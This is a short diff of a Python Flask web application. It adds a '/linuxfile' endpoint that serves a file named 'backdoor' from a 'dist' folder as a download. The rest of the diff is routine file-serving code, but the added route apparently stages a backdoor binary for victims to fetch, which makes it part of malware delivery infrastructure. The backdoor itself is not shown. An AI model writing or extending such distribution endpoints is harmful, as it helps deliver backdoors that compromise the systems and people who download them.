@@ -73,3 +73,16 @@ def file():
             return "File not found.", 404
     except Exception as e:
         return str(e), 500
+    
+
+@app.route('/linuxfile')
+def linuxfile():
+    try:
+        file_path = os.path.join('dist', "backdoor")
+
+        if os.path.isfile(file_path):
+            return send_file(file_path, as_attachment=True, download_name="backdoor")
+        else:
+            return "File not found.", 404
+    except Exception as e:
+        return str(e), 500
